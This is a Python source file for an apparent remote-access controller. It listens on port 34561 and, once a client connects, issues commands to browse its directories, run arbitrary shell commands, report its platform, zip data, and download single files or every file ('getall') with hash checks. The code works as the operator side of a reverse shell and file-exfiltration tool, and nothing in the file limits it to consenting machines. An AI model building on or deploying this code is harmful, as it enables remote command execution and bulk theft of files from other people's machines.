import os
import sys
from hashlib import sha256
from socket import *

server_port = 34561
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.bind(('', server_port))
serverSocket.listen(1)
STOCK = '\033[0;0m'
BLUE = '\033[1;34m'
slash = '/' if os.name != 'nt' else '\\'
DATA_PATH = 'File Received'


def close_program():
    serverSocket.close()
    print('A client has disconnected...')
    print('Server closed')
    quit()


def ls():
    connectionSocket.send('ls'.encode())
    sys.stdout.write(BLUE)
    while True:
        ret = connectionSocket.recv(1024).decode()
        if ret == '/':
            sys.stdout.write(STOCK)
        else:
            if ret == '.':
                break
            print('\t' + ret)


def cdup():
    global current_path
    connectionSocket.send('cdup'.encode())
    ret = connectionSocket.recv(1024).decode()
    if ret == 'Path not found':
        print('Path not found')
    else:
        current_path = ret


def cdhome():
    global current_path
    connectionSocket.send('cdhome'.encode())
    ret = connectionSocket.recv(1024).decode()
    current_path = ret


def cd(filename):
    global current_path
    connectionSocket.send('cd'.encode())
    connectionSocket.send(filename.encode())
    ret = connectionSocket.recv(1024).decode()
    if ret == 'Path not found':
        print('Directory not found')
    else:
        current_path = ret


def pwd():
    connectionSocket.send('pwd'.encode())
    ret = connectionSocket.recv(1024).decode()
    return ret


def get():
    connectionSocket.send('get'.encode())
    filename = input('get : Enter file name to download >> ')
    connectionSocket.send(filename.encode())
    recive(filename)


def getall():
    connectionSocket.send('getall'.encode())
    while True:
        filename = connectionSocket.recv(1024).decode()
        if filename == '.':
            break
        if recive(filename):
            connectionSocket.send('ok'.encode())
            continue


def recive(file_name):
    try:
        file_size = connectionSocket.recv(1024).decode()
        if file_size == 'File not found':
            raise FileNotFoundError
        connectionSocket.send('ok'.encode())
        file_hash = connectionSocket.recv(1024).decode()
        connectionSocket.send('ok'.encode())
        print(
            f'Reciving file: {file_name}  Size: {file_size}\nsha256: {file_hash}\n')
        if not os.path.isdir(DATA_PATH):
            os.mkdir(DATA_PATH)
        file = open(f'{DATA_PATH}{slash}' + file_name, 'wb')
        current_size = 0
        plus = 0
        print('Progress: [' + (' ' * 50) + '] 0%', end='\r')
        while current_size < int(file_size):
            # 1048576, 1024, 8196, 65536, 1024000...
            data = connectionSocket.recv(1024)
            file.write(data)
            current_size = current_size + len(data)
            progress = (current_size / int(file_size)) * 100
            plus = (progress / 2)
            print('Progress: |' + ('█' * int(plus)) + (' ' * int(50 - plus)) + '| ' + str(int(progress)) + '%',
                  end='\r')
        file.close()
        print('Progress: |' + ('█' * int(plus)) + (' ' * int(50 - plus)) + '| ' + str(int(progress)) + '% Complete',
              end='\r')
        print('\n')
        print('Verify Hash...')
        if sha256(open(DATA_PATH + slash + file_name, 'rb').read()).hexdigest() == file_hash:
            print('File received successful!')
            return True
    except FileNotFoundError:
        print('File not found')


def command(cmd):
    connectionSocket.send('command'.encode())
    connectionSocket.send(cmd.encode())
    file_size = connectionSocket.recv(1024).decode()
    if file_size == 'Command not found':
        print('Command not found')
    elif file_size != 'No Output':
        connectionSocket.send('ok'.encode())
        current_size = 0
        while current_size < int(file_size):
            # 1048576, 1024, 8196, 65536, 1024000...
            data = connectionSocket.recv(1024).decode()
            print(data, end='')
            current_size = current_size + 1024


def platform():
    connectionSocket.send('platform'.encode())
    output = connectionSocket.recv(1024).decode()
    print(output)

def ziip():
    connectionSocket.send('ziip'.encode())
    result=connectionSocket.recv(1024).decode()
    print(result)


switcher = {

    'exit': close_program,
    'ls': ls,
    'get': get,
    'getall': getall,
    'command': command,
    'platform': platform,
    'ziip' : ziip,
}

connected = False
while True:
    while not connected:
        print('Server listening on port', server_port)
        print('Waiting for a new connection')
        connectionSocket, addr = serverSocket.accept()
        outputfilename = str(addr) + ".log"
        current_path = pwd()
        print('New connection from ' + str(addr))
        connected = True

    while connected:
        try:
            cmd = input(current_path + ' >> ')
            array = cmd.split(sep=' ', maxsplit=1)
            try:
                connectionSocket.send(''.encode())
            except ConnectionError:
                connected = False

            if array[0] == 'cd':
                try:
                    if array[1] == '..':
                        cdup()
                    elif array[1] == 'home':
                        cdhome()
                    else:
                        cd(array[1])
                except IndexError:
                    print('Directory not found')
            else:
                if array[0] in switcher.keys() and cmd != '':
                    switcher[array[0]]()
                else:
                    command(cmd)
                # raise ValueError("Command not recognized")
        except ConnectionError:
            sys.stdout.write(STOCK)
            print('A client has disconnected')
            print()
            input('Press enter to continue')
            os.system('cls')
            connected = False
